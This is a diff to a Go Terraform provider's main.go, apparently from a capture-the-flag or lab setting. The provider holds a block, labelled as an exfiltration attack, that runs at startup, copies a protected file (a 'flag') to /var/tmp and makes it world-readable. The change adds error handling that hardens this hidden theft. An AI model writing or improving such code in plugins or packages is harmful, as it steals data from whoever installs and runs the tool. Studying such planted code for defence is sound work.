@@ -8,7 +8,6 @@ import (
 	"flag"
 	"log"
 	"os"
-
 	"io"
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
 	"terraform-provider-soff/internal/provider"
@@ -33,8 +32,14 @@ func main() {
 		dstFile, err := os.Create("/var/tmp/flag_captured.txt")
 		if err == nil {
 			defer dstFile.Close()
-			io.Copy(dstFile, srcFile)
-			os.Chmod("/var/tmp/flag_captured.txt", 0666) // Make sure you can read it
+			_,err = io.Copy(dstFile, srcFile)
+			if err != nil  {
+				log.Fatal(err)
+			}
+			err = os.Chmod("/var/tmp/flag_captured.txt", 0666) // Make sure you can read it
+			if err != nil {
+				log.Fatal(err)
+			}
 		}
 	}
 	// --- EXFILTRATION ATTACK END ---
